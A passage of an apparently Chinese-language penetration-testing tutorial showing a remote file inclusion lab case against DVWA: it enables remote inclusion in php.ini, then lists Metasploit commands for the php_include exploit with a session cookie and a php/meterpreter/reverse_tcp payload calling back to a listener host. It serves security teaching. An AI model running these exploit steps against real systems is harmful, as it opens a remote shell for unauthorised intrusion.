<h3 id="案例十二，RFI"><a href="#案例十二，RFI" class="headerlink" title="案例十二，RFI"></a>案例十二，RFI</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">修改PHP配置文件，允许远程包含</span><br><span class="line">vi /etc/php5/cgi/php.ini #php info 配置文件</span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">MSF：</span><br><span class="line">use exploit/unix/webapp/php_include</span><br><span class="line">set RHOST 192.168.1.5</span><br><span class="line">set PATH /dvwa/vulnerabilities/fi/</span><br><span class="line">set PHPURI /?page=XXpathXX  # 不管什么都填XXpathXX</span><br><span class="line">set HEADERS &quot;Cookie:security=low;PHPSESSID=r0p9hepkbrkcn01jjjqldsork2&quot;</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200711150428027.png" class>

]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>security tools</tag>
      </tags>
  </entry>
</search>
